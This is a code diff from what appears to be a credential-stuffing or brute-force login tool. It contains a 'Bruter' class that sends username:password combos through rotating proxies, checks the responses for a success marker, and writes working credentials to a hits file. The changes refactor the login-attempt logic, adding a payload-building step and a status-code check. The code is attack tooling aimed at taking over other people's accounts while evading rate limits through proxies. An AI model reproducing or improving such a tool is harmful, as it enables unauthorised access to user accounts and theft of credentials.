@@ -4,13 +4,13 @@ from .const import (response_success, response_error)
 from sys import path
 from threading import Thread
 from time import sleep
-
 from http.client import RemoteDisconnected
-from requests.exceptions import ProxyError, ConnectionError, SSLError, HTTPError
+from requests import codes as requests_codes
+from requests.exceptions import (ProxyError, ConnectionError, SSLError, HTTPError)
 from socket import error as socket_error
 from socket import timeout as socket_timeout
 from ssl import SSLError as ssl_SSLError
-from urllib3.exceptions import MaxRetryError, TimeoutError, ReadTimeoutError
+from urllib3.exceptions import (MaxRetryError, TimeoutError, ReadTimeoutError)
 
 
 class Bruter:
@@ -30,15 +30,16 @@ class Bruter:
         try:
             browser = Browser()
             browser.create()
-            browser.initialize(combo, proxy)
+            browser.set_details(combo, proxy)
             browser.set_header()
+            browser.build_payload()
             response = browser.post()
 
-            if response.ok and response_error not in str(response.text):
+            if response.status_code == requests_codes.ok and response_error not in response.text:
                 self.proxy_manager.disable(proxy, tested=True)
                 self.tested += 1
                 self.last_combo = combo
-                if response_success in str(response.text):
+                if response_success in response.text:
                     self.hits.write(combo[0] + ':' + combo[1] + '\n')
 
             else:
